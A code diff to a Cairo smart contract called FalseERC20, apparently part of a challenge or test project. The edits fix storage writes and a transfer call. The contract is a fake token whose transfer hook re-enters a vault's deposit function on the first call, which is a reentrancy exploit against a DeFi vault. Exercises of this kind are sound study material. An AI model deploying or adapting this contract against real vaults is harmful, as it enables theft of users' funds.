@@ -11,6 +11,7 @@ mod FalseERC20 {
     use core::serde::Serde;
     use core::box::BoxTrait;
     use core::zeroable::Zeroable;
+    use pharaonik::interfaces::IERC20Camel::IERC20Camel;
     use pharaonik::interfaces::IERC20Camel::{IERC20CamelDispatcher, IERC20CamelDispatcherTrait};
     use pharaonik::interfaces::ISubDefiVault::{
         ISubDefiVaultDispatcher, ISubDefiVaultDispatcherTrait
@@ -62,9 +63,9 @@ mod FalseERC20 {
         weth_address: ContractAddress,
         wETH_vault: ContractAddress
     ) {
-        owner.write(owner);
-        wETH.write(weth_address);
-        wETH_vault.write(wETH_vault);
+        self.owner.write(owner);
+        self.wETH.write(weth_address);
+        self.wETH_vault.write(wETH_vault);
     }
 
     #[abi(embed_v0)]
@@ -115,7 +116,9 @@ mod FalseERC20 {
                 ISubDefiVaultDispatcher { contract_address: self.wETH_vault.read() }
                     .deposit(increased_amount, self.owner.read(), get_contract_address());
             } else if (call_count == 1) {
-                IERC20CamelDispatcher { contract_address }.transfer(self.wETH_vault.read(), amount);
+                // Second call
+                IERC20CamelDispatcher { contract_address: self.wETH.read() }
+                    .transfer(self.wETH_vault.read(), amount);
             }
             true
         }
@@ -197,10 +200,6 @@ mod FalseERC20 {
             self._total_supply.write(self._total_supply.read() - amount);
             self._balances.write(account, self._balances.read(account) - amount);
             self.emit(Transfer { from: account, to: Zeroable::zero(), value: amount });
-        }
-
-        fn _reenter(ref self: ContractState) {
-            self.sub_defi_vault.read().deposit(amount, self.owner.read(), get_contract_address());
         }
     }
 }
